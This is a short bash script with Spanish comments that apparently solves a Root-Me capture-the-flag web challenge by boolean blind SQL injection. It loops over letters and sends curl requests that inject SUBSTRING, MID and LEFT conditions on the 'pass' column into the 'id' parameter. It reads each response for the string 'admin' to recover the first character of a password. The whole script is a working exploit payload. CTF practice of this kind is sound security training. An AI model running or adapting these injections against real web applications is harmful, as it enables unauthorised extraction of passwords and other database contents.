#!/bin/bash

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${YELLOW}[+] Probando diferentes funciones...${NC}"

# Probar diferentes funciones para extraer la primera letra
for char in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    # SUBSTRING
    result1=$(curl -s "$URL?action=membres&id=1' AND SUBSTRING(pass,1,1)='$char" | grep -c "admin")
    if [ "$result1" -gt 0 ]; then
        echo -e "${GREEN}[✓] SUBSTRING: '$char'${NC}"
        break
    fi
    
    # MID
    result2=$(curl -s "$URL?action=membres&id=1' AND MID(pass,1,1)='$char" | grep -c "admin")
    if [ "$result2" -gt 0 ]; then
        echo -e "${GREEN}[✓] MID: '$char'${NC}"
        break
    fi
    
    # LEFT
    result3=$(curl -s "$URL?action=membres&id=1' AND LEFT(pass,1)='$char" | grep -c "admin")
    if [ "$result3" -gt 0 ]; then
        echo -e "${GREEN}[✓] LEFT: '$char'${NC}"
        break
    fi
done
